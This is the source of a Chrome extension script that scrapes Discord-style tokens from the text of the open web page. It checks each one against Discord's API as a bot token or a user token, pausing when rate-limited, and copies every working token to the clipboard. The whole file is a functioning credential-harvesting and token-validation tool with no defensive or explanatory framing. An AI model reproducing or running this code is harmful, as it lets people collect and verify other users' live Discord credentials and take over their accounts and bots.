document.getElementById('scanButton').addEventListener('click', async () => {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => Array.from(new Set((document.body.innerText.match(/[\w-]{24,}\.[\w-]{6}\.[\w-]{38}/g) || [])))
    }, async (results) => {
        if (chrome.runtime.lastError) {
            console.error("Script injection failed: " + chrome.runtime.lastError.message);
            return;
        }
        const tokens = results[0].result;
        const resultElement = document.getElementById('result');
        resultElement.textContent = `Validating ${tokens.length} Token${tokens.length === 1 ? "" : "s"}... (0 / ${tokens.length})`;
        resultElement.style.color = '#f7e02d';
        if (tokens.length > 0) {
        let valid = []
        let bots = 0;
        let users = 0;
        let invalid = 0;
        let errors = 0;
        let all = 0;

        for (const token of tokens) {
            all++;
            const [type, response, username] = await validate(token);
            if (type == "BOT" || type == "USER") {
                if (type == "BOT") bots++;
                if (type == "USER") users++;
                valid.push(`${type} ${token}`)
            } else if (type == "ERROR") {
                errors++;
                valid.push(`============ ${type} ${response} ============= PLEASE REPORT THIS ERROR TO SPIGGMA ON DISCORD`)
            } else if (type == "RATELIMIT") {
                valid.push(`${type} ${token} ====== WAS RATELIMITED, MUST VALIDATE AGAIN`)
                await new Promise(resolve => setTimeout(resolve, 3000))
            } else {
                all--;
                invalid++;
            }
            resultElement.textContent = `Validating ${tokens.length} Token${tokens.length === 1 ? "" : "s"}... (${all} / ${tokens.length - invalid})`;
            if(token != tokens[tokens.length - 1]) await new Promise(resolve => setTimeout(resolve, 1750));
        }
        if (valid.length > 0) {
            await navigator.clipboard.writeText(valid.join("\n"))
            resultElement.textContent = `Extracted ${valid.length} tokens!`;
            resultElement.style.color = '#27a82f';
        } else{
            resultElement.textContent = `All tokens are invalid.
            `;
            resultElement.style.color = '#d12a2a';
        }
        } else {
            resultElement.textContent = "No tokens found.";
            resultElement.style.color = '#d12a2a';
        }
    });
});

async function validate(token) {
    token = token.trim();
    try {
        let response = await fetch('https://discord.com/api/users/@me', {headers: {'Authorization': 'Bot ' + token.replace(/\n/g, '').replace(/‏/g, '')}});
        if(response.status == 429) return ["RATELIMIT", "429", null];
        if (response.status !== 401) {
            return ["BOT", response.status.toString(), (await response.json()).username];
        } else {
            response = await fetch('https://discord.com/api/users/@me', {headers: {'Authorization': token.replace(/\n/g, '').replace(/‏/g, '')}});
            if (response.status !== 401) {
                return ["USER", response.status.toString(), (await response.json()).username];
            } else {
                return ["INVALID", response.status.toString(), null];
            }
        }
    } catch (error) {
        return ["ERROR", error.toString(), null];
    }
}